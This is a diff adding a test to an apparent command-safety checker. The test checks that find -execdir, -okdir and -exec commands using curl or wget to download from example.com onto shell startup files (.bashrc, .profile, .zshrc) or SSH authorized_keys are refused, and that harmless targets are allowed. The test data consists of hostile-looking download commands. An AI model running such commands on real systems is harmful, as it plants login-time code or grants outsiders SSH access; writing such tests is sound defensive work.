@@ -105,6 +105,30 @@ def test_a_download_into_authorized_keys_is_refused_also_after_a_lost_cd():
     assert check_command("D=~ && D=~/x; cd $D; " + DL + " -o keys.txt").verdict == "allow"
 
 
+def test_a_download_written_by_find_execdir_to_a_bare_startup_or_key_file_name_is_refused():
+    """find -execdir runs its command from the folder of each matched file, so a bare startup-file or key-file name is protected."""
+    url = "https://example.com/x"
+    rc = "destructive:rc_download"
+    assert check_command("find ~ -execdir curl -o .bashrc " + url + " ;").rule == rc
+    assert check_command("find ~/.ssh -name x -execdir wget -O authorized_keys " + url + " ;").rule == rc
+    assert check_command("find ~/.ssh -name x -okdir wget -O authorized_keys2 " + url + " ;").rule == rc
+    # The starting path cannot be read (variable, substitution, glob): the file name alone decides.
+    assert check_command('find "$D" -execdir curl -o .profile ' + url + " ;").rule == rc
+    assert check_command("find /srv/* -execdir curl -o sub/.zshrc " + url + " ;").rule == rc
+    # A folder below the starting path can be the home folder or ~/.ssh.
+    assert check_command("find /home/alice -execdir curl -o .zshrc " + url + " ;").rule == rc
+    assert check_command("find /home/alice/.ssh -execdir curl -o authorized_keys " + url + " ;").rule == rc
+    # Harmless relative targets stay allowed, whatever the starting path.
+    assert check_command("find . -execdir curl -o out.txt " + url + " ;").verdict == "allow"
+    assert check_command("find ~ -execdir curl -o out.txt " + url + " ;").verdict == "allow"
+    assert check_command('find "$D" -execdir curl -o keys.txt ' + url + " ;").verdict == "allow"
+    # -exec runs from the folder find was started in: its folder is the one of the line, a bare name is read from there.
+    assert check_command("find ~ -exec curl -o ~/.bashrc " + url + " ;").rule == rc
+    assert check_command("cd ~ && find . -exec curl -o .bashrc " + url + " ;").rule == rc
+    assert check_command("find ~ -exec curl -o out.txt " + url + " ;").verdict == "allow"
+    assert check_command("find ~ -exec curl -o .bashrc " + url + " ;").verdict == "allow"
+
+
 def test_deeply_nested_quoted_substitutions_are_refused_quickly():
     import time
 
